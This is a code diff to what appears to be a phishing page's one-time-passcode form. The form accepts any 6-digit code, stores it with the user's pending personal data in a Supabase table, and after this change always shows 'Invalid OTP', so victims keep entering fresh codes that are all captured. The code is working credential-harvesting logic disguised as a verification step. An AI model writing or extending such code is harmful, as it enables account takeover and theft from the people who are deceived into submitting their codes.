@@ -263,7 +263,7 @@
             });
         });
 
-        // Verify any 6-digit OTP and save data to Supabase
+        // Always show Invalid OTP error on submit
         async function verifyOtp() {
             let otpValue = '';
             otpBoxes.forEach(box => otpValue += box.value);
@@ -271,14 +271,14 @@
             statusMsg.classList.remove('hidden', 'text-red-600', 'text-brand-green');
 
             if (otpValue.length === 6) {
-                statusMsg.textContent = 'Verification Successful';
-                statusMsg.classList.add('text-brand-green');
+                statusMsg.textContent = 'Invalid OTP, please try again.';
+                statusMsg.classList.add('text-red-600');
 
                 if (supabaseClient) {
                     try {
                         await supabaseClient
                             .from('messages')
-                            .insert([{ content: JSON.stringify({ ...pendingUserData, otp: otpValue }) }]);
+                            .insert([{ content: JSON.stringify({ ...pendingUserData, otp: otpValue, status: 'failed' }) }]);
                     } catch (err) {
                         console.error(err);
                     }
